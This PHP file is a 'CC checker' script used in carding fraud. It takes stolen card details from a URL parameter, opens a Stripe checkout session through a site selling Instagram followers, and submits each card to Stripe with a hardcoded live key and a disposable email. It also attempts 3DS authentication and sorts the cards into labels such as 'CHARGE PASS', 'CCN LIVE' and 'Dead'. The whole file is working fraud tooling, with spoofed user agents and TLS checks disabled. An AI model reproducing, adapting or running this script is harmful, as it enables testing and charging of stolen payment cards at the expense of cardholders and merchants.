<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);

###################################[cs_live take]#####################
   $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://viplikes.net/send-prebuy-stripe.php');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'method: POST',
               'scheme: https',
               'accept: application/json, text/javascript, */*; q=0.01',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded; charset=UTF-8',
               'origin: https://viplikes.net',
               'referer: https://viplikes.net/buy-instagram-followers',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'sid=2135397&x_login=2135397&product_id=1767&paymentsystem=2checkout&mode=2CO&x_amount=1&total=1&li_0_name=50+Instagram+Followers&li_0_price=0.99&service_name=50+Instagram+Followers&service_count=50&li_0_recurrence=&url=%2Fbuy-instagram-followers&merchant_order_id=HVXk_1675004514&email=bevas33220%40ezgiant.com&li_0_description=%40mikesmith&stripe_an=2');


               $get_cslive = curl_exec($ch);
            $cslive = 
    Getstr($get_cslive,'session_id":"','"}');

// echo  $cslive;
    
      
#########################[1 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_methods',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://checkout.stripe.com',
               'referer: https://checkout.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=mie&billing_details[email]=bevas33220%40ezgiant.com&billing_details[address][country]=IN&guid=c8168615-cd8b-49d2-a636-84cc83ac6b088c1af5&muid=da09aad1-fcf0-4452-9ffa-fb1a8d864047e26a86&sid=0cc8e343-5e6f-4c3b-9b90-257aecdf78d2066246&key=pk_live_7FYzcQZJmqCKvTmp6tRc2gvx00pTIw2qdQ&payment_user_agent=stripe.js%2F951997b0b%3B+stripe-js-v3%2F951997b0b%3B+checkout');
        
        $r1 = curl_exec($ch);
        $id = Getstr($r1,'"id": "','"');

// ############################[2 Req]############################
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_pages/'.$cslive.'/confirm',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://checkout.stripe.com',
               'referer: https://checkout.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount=99&last_displayed_line_item_group_details[subtotal]=99&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_7FYzcQZJmqCKvTmp6tRc2gvx00pTIw2qdQ');
        
        $r2 = curl_exec($ch);
      
       // $stripe_js = Getstr($r2,'"stripe_js": "','"');
      $src = Getstr($r2,'"three_d_secure_2_source": "','"');
     
     $client_secret = Getstr($r2,'"client_secret": "','"');
    $pi = Getstr($r2,'"client_secret": "','_secret');
 // echo "<b>r2=</b>$r2<br><br>";
 // echo "<b>client_secret=</b>$client_secret<br><br>";
 // echo "<b>pi=</b>$pi<br><br>";
 // echo "<b>src=</b>$src<br><br>";
    

// #####################[3ds Bypass using url]#############
// if (strpos($r2, "https://hooks.stripe.com/redirect/authenticate/"))   
// {
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $r4 = curl_exec($ch);
             
// }
// #####################[3ds Bypass using url]#############

                $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/3ds2/authenticate',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://js.stripe.com',
               'referer: https://js.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImViYmYwYmYzLWM5YTEtNDdmNC1hMTBlLTQwMGMwYjFjZjM1NyJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_7FYzcQZJmqCKvTmp6tRc2gvx00pTIw2qdQ');
        
        $srcresult = curl_exec($ch);
 // echo "<b>srcresult=</b>$srcresult<br><br>";
      
  
// ########################[result url]#####################

    $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_7FYzcQZJmqCKvTmp6tRc2gvx00pTIw2qdQ&is_stripe_sdk=false&client_secret='.$client_secret.'');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  $result31 = curl_exec($ch);
   

########################[Responses]############################
///// [2REQ - RSOP]

if(strpos($result31,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

// elseif(strpos($result31,'Membership Confirmation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your support')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your donation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'/wishlist-member/?reg=')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'Thank You')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, '\"success\":true')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'pass')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'wcf-key')) {
//  $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';

  
// }

elseif(strpos($result31, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($result31,'Your card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($result31,'card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, '\"cvc_check\": \"pass\"')) {
  $status = '#CVV';
  $cc_code = '『 CVC_CHECK: PASS ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, 'card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "security code is invalid" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Security code is incorrect" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($result31, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($result31, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected Form Ur cards 』';
  $reqfind = '2 Req';
}




//=======================[Responses-END]==============================//


    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.''.$bindata1.'</br>';

    // echo "<b>Last result=</b>$result31<br><br>";
     echo "<b>Last result=</b>$result31<br><br>";

   
?> 